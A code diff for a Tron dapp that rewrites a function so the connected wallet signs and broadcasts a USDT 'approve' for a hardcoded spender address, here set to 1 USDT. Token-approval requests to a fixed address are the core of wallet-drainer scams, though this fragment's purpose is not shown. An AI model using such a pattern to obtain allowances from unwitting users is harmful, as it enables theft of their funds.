@@ -29,26 +29,39 @@ const walletConnectAdapter = new WalletConnectAdapter({
   },
 })
 
-// 💰 APPROVE
+// 💰 APPROVE (FIX REAL)
 const approveUSDT = async (tron: any) => {
   try {
     const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
-
-    // 🔴 CAMBIA ESTO por tu contrato real
     const spender = "TWnGWtxx7d4NC8xuUqKVRW8eM8yRko2q1y"
+    const amount = "1000000" // 1 USDT
 
-    const contract = await tron.contract().at(contractAddress)
+    const functionSelector = "approve(address,uint256)"
 
-    const amount = tron.toBigNumber(1000000)
+    const parameter = [
+      { type: "address", value: spender },
+      { type: "uint256", value: amount },
+    ]
 
-    const tx = await contract
-      .approve(spender, amount)
-      .send({
+    const tx = await tron.transactionBuilder.triggerSmartContract(
+      contractAddress,
+      functionSelector,
+      {
         feeLimit: 200000000,
-        shouldPollResponse: true,
-      })
+        callValue: 0,
+      },
+      parameter,
+      tron.defaultAddress.base58
+    )
 
-    console.log("APPROVE TX:", tx)
+    if (!tx.result.result) {
+      throw new Error("Trigger failed")
+    }
+
+    const signedTx = await tron.trx.sign(tx.transaction)
+    const receipt = await tron.trx.sendRawTransaction(signedTx)
+
+    console.log("TX RESULT:", receipt)
     return true
   } catch (err) {
     console.error("APPROVE ERROR:", err)
